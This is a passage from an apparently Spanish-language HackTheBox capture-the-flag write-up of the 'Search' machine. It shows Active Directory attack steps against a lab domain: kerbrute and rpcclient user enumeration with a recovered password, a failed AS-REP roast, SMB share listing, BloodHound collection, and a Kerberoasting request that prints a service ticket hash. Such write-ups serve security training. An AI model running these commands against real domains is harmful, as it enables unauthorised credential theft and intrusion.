+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">-d</span> search.htb <span class="nt">--dc</span> research.search.htb users.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/07/24 - Ronnie Flathers @ropnop
+
+2024/04/07 15:24:20 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/04/07 15:24:20 <span class="o">&gt;</span>  	research.search.htb:88
+
+2024/04/07 15:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Hope.Sharp@search.htb
+2024/04/07 15:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 hope.sharp@search.htb
+2024/04/07 15:24:20 <span class="o">&gt;</span>  Done! Tested 7 usernames <span class="o">(</span>2 valid<span class="o">)</span> <span class="k">in </span>0.096 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>Si recordamos tenemos el <code class="language-plaintext highlighter-rouge">RPC</code> abierto y como ahora si tenemos credenciales vamos a conectarnos para enumerar usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hope.sharp%IsolationIsKey?"</span> 10.129.229.57
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[Santino.Benjamin] rid:[0x4aa]
+user:[Payton.Harmon] rid:[0x4ab]
+user:[Trace.Ryan] rid:[0x4ac]
+user:[Reginald.Morton] rid:[0x4ad]
+user:[Eddie.Stevens] rid:[0x4ae]
+user:[Cortez.Hickman] rid:[0x4af]
+user:[Chace.Oneill] rid:[0x4b0]
+user:[Abril.Suarez] rid:[0x4b1]
+user:[Savanah.Velazquez] rid:[0x4b2]
+user:[Antony.Russo] rid:[0x4b3]
+user:[Cameron.Melendez] rid:[0x4b4]
+user:[Edith.Walls] rid:[0x4b5]
+user:[Lane.Wu] rid:[0x4b6]
+user:[Arielle.Schultz] rid:[0x4b7]
+user:[Bobby.Wolf] rid:[0x4b8]
+user:[Blaine.Zavala] rid:[0x4b9]
+user:[Margaret.Robinson] rid:[0x4ba]
+user:[Celia.Moreno] rid:[0x4bb]
+user:[Kaitlynn.Lee] rid:[0x4bc]
+user:[Kyler.Arias] rid:[0x4bd]
+user:[Saniyah.Roy] rid:[0x4be]
+user:[Sarai.Boone] rid:[0x4bf]
+user:[Jermaine.Franco] rid:[0x4c0]
+user:[Alfred.Chan] rid:[0x4c1]
+user:[Jamar.Holt] rid:[0x4c2]
+user:[Sandra.Wolfe] rid:[0x4c3]
+user:[Rene.Larson] rid:[0x4c4]
+user:[Yareli.Mcintyre] rid:[0x4c5]
+user:[Griffin.Maddox] rid:[0x4c6]
+user:[Prince.Hobbs] rid:[0x4c7]
+user:[Armando.Nash] rid:[0x4c8]
+user:[Sonia.Schneider] rid:[0x4c9]
+user:[Maeve.Mann] rid:[0x4ca]
+user:[Lizeth.Love] rid:[0x4cb]
+user:[Amare.Serrano] rid:[0x4cc]
+user:[Savanah.Knox] rid:[0x4cd]
+user:[Frederick.Cuevas] rid:[0x4ce]
+user:[Marshall.Skinner] rid:[0x4cf]
+user:[Edgar.Jacobs] rid:[0x4d0]
+user:[Elisha.Watts] rid:[0x4d1]
+user:[Belen.Compton] rid:[0x4d2]
+user:[Amari.Mora] rid:[0x4d3]
+user:[Cadence.Conner] rid:[0x4d4]
+user:[Katelynn.Costa] rid:[0x4d5]
+user:[Sage.Henson] rid:[0x4d6]
+user:[Maren.Guzman] rid:[0x4d7]
+user:[Natasha.Mayer] rid:[0x4d8]
+user:[Chanel.Bell] rid:[0x4d9]
+user:[Scarlett.Parks] rid:[0x4da]
+user:[Eliezer.Jordan] rid:[0x4db]
+user:[Dax.Santiago] rid:[0x4dc]
+user:[Lillie.Saunders] rid:[0x4dd]
+user:[Jayla.Roberts] rid:[0x4de]
+user:[Lorelei.Huang] rid:[0x4df]
+user:[Taniya.Hardy] rid:[0x4e0]
+user:[Charlee.Wilkinson] rid:[0x4e1]
+user:[Monique.Moreno] rid:[0x4e2]
+user:[Desmond.Bonilla] rid:[0x4e3]
+user:[Claudia.Sharp] rid:[0x4e4]
+user:[Abbigail.Turner] rid:[0x4e5]
+user:[Yaritza.Riddle] rid:[0x4e6]
+user:[Tori.Mora] rid:[0x4e7]
+user:[Hugo.Forbes] rid:[0x4e8]
+user:[Jolie.Lee] rid:[0x4e9]
+user:[German.Rice] rid:[0x4ea]
+user:[Zain.Hopkins] rid:[0x4eb]
+user:[Hope.Sharp] rid:[0x4ec]
+user:[Kylee.Davila] rid:[0x4ed]
+user:[Melanie.Santiago] rid:[0x4ee]
+user:[Hunter.Kirby] rid:[0x4ef]
+user:[Annabelle.Wells] rid:[0x4f0]
+user:[Ada.Gillespie] rid:[0x4f1]
+user:[Gunnar.Callahan] rid:[0x4f2]
+user:[Aarav.Fry] rid:[0x4f3]
+user:[Colby.Russell] rid:[0x4f4]
+user:[Eve.Galvan] rid:[0x4f5]
+user:[Jeramiah.Fritz] rid:[0x4f6]
+user:[Cade.Austin] rid:[0x4f7]
+user:[Keely.Lyons] rid:[0x4f8]
+user:[Abby.Gonzalez] rid:[0x4f9]
+user:[Joy.Costa] rid:[0x4fa]
+user:[Vincent.Sutton] rid:[0x4fb]
+user:[Cesar.Yang] rid:[0x4fc]
+user:[Camren.Luna] rid:[0x4fd]
+user:[Tyshawn.Peck] rid:[0x4fe]
+user:[Keith.Hester] rid:[0x4ff]
+user:[Braeden.Rasmussen] rid:[0x500]
+user:[Angel.Atkinson] rid:[0x501]
+user:[Sierra.Frye] rid:[0x502]
+user:[Maci.Graves] rid:[0x503]
+user:[Judah.Frye] rid:[0x504]
+user:[Tristen.Christian] rid:[0x505]
+user:[Crystal.Greer] rid:[0x506]
+user:[Kayley.Ferguson] rid:[0x507]
+user:[Haven.Summers] rid:[0x508]
+user:[Isabela.Estrada] rid:[0x509]
+user:[Kaylin.Bird] rid:[0x50a]
+user:[Angie.Duffy] rid:[0x50b]
+user:[Claudia.Pugh] rid:[0x50c]
+user:[Jordan.Gregory] rid:[0x50d]
+user:[web_svc] rid:[0x510]
+user:[Tristan.Davies] rid:[0x512]
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos añadirlos a una lista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hope.sharp%IsolationIsKey?"</span> 10.129.229.57 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'0x'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> all.txt
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos aplicar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> <a href="https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/">https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/</a>.</p>
+  </li>
+  <li>
+    <p>Pero no tenemos existo ya que los usuarios no tienen el <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIERE_PREAUTH</code> set.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers search.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> all.txt
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User Santino.Benjamin doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Payton.Harmon doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Trace.Ryan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Reginald.Morton doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Eddie.Stevens doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Cortez.Hickman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Chace.Oneill doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Abril.Suarez doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Savanah.Velazquez doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Antony.Russo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Cameron.Melendez doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Edith.Walls doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Lane.Wu doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Arielle.Schultz doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Bobby.Wolf doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Blaine.Zavala doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Margaret.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Celia.Moreno doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kaitlynn.Lee doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Kyler.Arias doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Saniyah.Roy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Sarai.Boone doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jermaine.Franco doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Alfred.Chan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jamar.Holt doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Sandra.Wolfe doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Rene.Larson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Yareli.Mcintyre doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Griffin.Maddox doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Prince.Hobbs doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Armando.Nash doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Sonia.Schneider doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Maeve.Mann doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Lizeth.Love doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Amare.Serrano doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Savanah.Knox doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Frederick.Cuevas doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Marshall.Skinner doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Edgar.Jacobs doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Elisha.Watts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Belen.Compton doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Amari.Mora doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Cadence.Conner doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Katelynn.Costa doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Sage.Henson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Maren.Guzman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Natasha.Mayer doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Chanel.Bell doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Scarlett.Parks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Eliezer.Jordan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Dax.Santiago doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Lillie.Saunders doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jayla.Roberts doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Lorelei.Huang doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Taniya.Hardy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Charlee.Wilkinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Monique.Moreno doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Desmond.Bonilla doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Claudia.Sharp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Abbigail.Turner doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Yaritza.Riddle doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Tori.Mora doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Hugo.Forbes doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Jolie.Lee doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User German.Rice doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Zain.Hopkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Hope.Sharp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Kylee.Davila doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Melanie.Santiago doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Hunter.Kirby doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Annabelle.Wells doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Ada.Gillespie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Gunnar.Callahan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Aarav.Fry doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Colby.Russell doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Eve.Galvan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jeramiah.Fritz doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Cade.Austin doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Keely.Lyons doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Abby.Gonzalez doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Joy.Costa doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Vincent.Sutton doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Cesar.Yang doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Camren.Luna doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Tyshawn.Peck doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Keith.Hester doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Braeden.Rasmussen doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Angel.Atkinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Sierra.Frye doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Maci.Graves doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Judah.Frye doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Tristen.Christian doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Crystal.Greer doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Kayley.Ferguson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Haven.Summers doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Isabela.Estrada doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kaylin.Bird doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Angie.Duffy doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Claudia.Pugh doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Jordan.Gregory doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User web_svc doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Tristan.Davies doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<ul>
+  <li>Bueno vamos a ver recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> hope.sharp  <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">--shares</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\h</span>ope.sharp:IsolationIsKey?
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.229.57   445    RESEARCH         ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C<span class="nv">$ </span>                             Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.229.57   445    RESEARCH         helpdesk
+SMB         10.129.229.57   445    RESEARCH         IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders<span class="nv">$ </span>READ,WRITE
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a ver lo que hay dentro de <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code>.</p>
+  </li>
+  <li>
+    <p>No vemos nada interesante.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">-r</span> RedirectedFolders<span class="nv">$ </span><span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="err">$</span>
+	dr--r--r--                0 Sun Apr  7 15:55:18 2024	<span class="nb">.</span>
+	dr--r--r--                0 Sun Apr  7 15:55:18 2024	..
+	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
+	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
+	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
+	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
+	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
+	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
+	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
+	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
+	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
+	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
+	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
+	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
+	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
+	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
+	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
+	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
+	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
+	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
+	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
+	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
+	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<h2 id="web_scv">web_scv</h2>
+
+<ul>
+  <li>
+    <p>No encontramos nada a si que vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar y buscar vías para escalar privilegios <a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a>.</p>
+  </li>
+  <li>
+    <p>Para recolectar información vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound-python</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content bloodhound-python <span class="nt">-u</span> <span class="s1">'hope.sharp'</span> <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">-c</span> All <span class="nt">-ns</span> 10.129.229.57 <span class="nt">-d</span> search.htb
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora tienes que subir los archivos <code class="language-plaintext highlighter-rouge">.json</code> al <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
+  </li>
+  <li>
+    <p>Estos son los usuarios que pertenecen al grupo <code class="language-plaintext highlighter-rouge">DOMAIN ADMINS</code> vemos a <code class="language-plaintext highlighter-rouge">Tristan.Davies</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/5.png" />
+</p>
+
+<ul>
+  <li>Y bueno vemos que el usuario WEB_SVC es <code class="language-plaintext highlighter-rouge">kerberoastable</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/6.png" />
+</p>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">GETUsersSPN.py</code> para solicitar el TGS del usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs search.htb/hope.sharp <span class="nt">-request</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+<span class="nt">---------------------------------</span>  <span class="nt">-------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  &lt;never&gt;
+
+
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+<span class="nv">$krb5tgs$23$*</span>web_svc<span class="nv">$SEARCH</span>.HTB<span class="nv">$search</span>.htb/web_svc<span class="k">*</span><span class="nv">$ef435038d4624caac1c1e1fe0a242fae$ae77292d085f959d097ee988ae8ba39fbf3b7d1c3b72efc19bf7c8197ab68c88d4a4c34bca1261ca6239a5bbd9fa375ef3dd6f8aa38c808a10bf44ea06baecbfb6c5dc7d0549de684ec0fe3462726c8098094d298587ca0c2b99cfb4276502d95c324bb6f2197131536701dbd3325da0fa38952bbbdc7a062fa5d0cade5ac935e6442f7bd80e537709cc1b73553320669b4f711079735eb549a1243874520b7437ccb76e0c15b133c0887ab3842a93d8890e5da870844f5cfdbe9cdf0039ea2ad712c0503dd947afd82069d1f1bee24bdada3d372ae7f86cea9eb59cc7ebede4097ad20b177dd200f9268f4fc767b8ebfad8c932632f8d1559b913c9139a26fe10eec2c856faedb948e266fc569d3d1ebf61a294c464ccf3952880172acc414085edeb9f8a9faef28e8e4885308949c200716c8918c7850b7bbdb89f89a6d63e03d0a590672599501c0daae91901eb6c87f1ebe9d2ea01a44014ffcf4d8e48d652165b05108031e1cabbaf86699b6bcb918e3fc647766a4f34328d3900e1f562c9dea1b170d4d24e2105a54421f86b8acef8d06b33b48bbb74693587a49710c1d589d9273c5a6740ade98557cc16cca284016d7e577190941c227be7933dbd9ae835ed1faf2a5579cd65facbd985dc4af88bb41318cc285077fb813541887b1868fd963de1291e19144f698a1b4ff723bd98f3e6bf81cfa9491d1a8f089107fceac81ba512d3a4c0e0cbf292051c08296870a1df3e90bd2470c3fec06c0f24aac52f2f39446b00052bed6b414fe570a6638b8b5adf2227b9fe3aacd7e43b980b65b3bce8a515340940a147bc00722f9831d718f9f20e9e46964fe871841663c0c42af96de540f30456f7cc011b31df229dd4d21e9c5606c7d09e24f36173461a30453b717c6813bdc5eb64c8d9d94e08e54d311b71fdf66ec1595e6ec5c3dfce1c2e0459c478dabecbf8396b750c8a9d9ec217d17b9291a3aee831dc4ab1a94b003e017f29e249520f2a38e62243da55663cf3b377a29501d979354c9d0c0213b572c92ee473df614c07bb9b55ad7be3684b16aaba088e340369c510c387b6395b3f4f9d6c29360db08855b18727a42e0f5e57d06bde11d8322b4df72d289759ef67fe1c167a9113760ca205384cbdf3d4510fdcf5765131282647fbe9bb748119b3f6f909e63fe57b9